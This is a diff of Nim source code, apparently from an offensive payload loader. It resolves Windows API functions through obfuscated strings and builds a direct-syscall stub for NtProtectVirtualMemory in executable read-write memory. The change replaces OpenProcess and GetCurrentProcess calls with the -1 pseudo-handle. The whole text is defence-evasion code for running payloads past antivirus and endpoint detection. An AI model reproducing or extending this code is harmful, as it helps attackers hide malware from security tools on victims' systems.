@@ -5,28 +5,28 @@ const
   KERNEL32_DLL* = obf("kernel32.dll")
 
 type
-  GetCurrentProcess_t* = proc (): DWORD {.stdcall.}
-  GetCurrentProcessId_t* = proc (): DWORD {.stdcall.}
+  #GetCurrentProcess_t* = proc (): DWORD {.stdcall.}
+  #GetCurrentProcessId_t* = proc (): DWORD {.stdcall.}
   VirtualAllocEx_t* = proc (hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD): LPVOID {.stdcall.}
   OpenProcess_t* = proc (dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, dwProcessId: DWORD): HANDLE {.stdcall.}
   VirtualProtect_t* = proc (lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: PDWORD): WINBOOL {.stdcall.}
 
 const
-  GetCurrentProcessId_HASH * = obf("GetCurrentProcessId")
+  #GetCurrentProcessId_HASH * = obf("GetCurrentProcessId")
   VirtualAllocEx_HASH * = obf("VirtualAllocEx")
-  GetCurrentProcess_HASH * = obf("GetCurrentProcess")
+  #GetCurrentProcess_HASH * = obf("GetCurrentProcess")
   OpenProcess_HASH * = obf("OpenProcess")
   VirtualProtect_HASH * = obf("VirtualProtect")
 
-var MyGetCurrentProcess*: GetCurrentProcess_t
+#var MyGetCurrentProcess*: GetCurrentProcess_t
 var MyVirtualAllocEx*: VirtualAllocEx_t
-var MyGetCurrentProcessId*: GetCurrentProcessId_t
+#var MyGetCurrentProcessId*: GetCurrentProcessId_t
 var MyOpenProcess*: OpenProcess_t
 var MyVirtualProtect*: VirtualProtect_t
 
-MyGetCurrentProcess = cast[GetCurrentProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentProcess_HASH, 0, FALSE)))
+#MyGetCurrentProcess = cast[GetCurrentProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentProcess_HASH, 0, FALSE)))
 
-MyGetCurrentProcessId = cast[GetCurrentProcessId_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentProcessId_HASH, 0, FALSE)))
+#MyGetCurrentProcessId = cast[GetCurrentProcessId_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentProcessId_HASH, 0, FALSE)))
 
 MyVirtualProtect = cast[VirtualProtect_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualProtect_HASH, 0, FALSE))
 
@@ -223,19 +223,16 @@ let NtProtectSyscallStart * = """
 
     var hProcess: HANDLE
     when defined(DInvoke):
-        hProcess = MyGetCurrentProcess()
-        
-        let tProcess2 = MyGetCurrentProcessId()
+        hProcess = -1
 
-        var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
+        var pHandle2: HANDLE = -1
         var syscallStub_NtProtect: LPVOID
 
         MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
         syscallStub_NtProtect = MyVirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
     else:
-        hProcess = GetCurrentProcess()
-        let tProcess2 = GetCurrentProcessId()
-        var pHandle2: HANDLE = OpenProcess(cast[DWORD](PROCESS_ALL_ACCESS), cast[WINBOOL](FALSE), tProcess2)
+        hProcess = -1
+        var pHandle2: HANDLE = -1
         var syscallStub_NtProtect: LPVOID
         syscallStub_NtProtect = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
 """
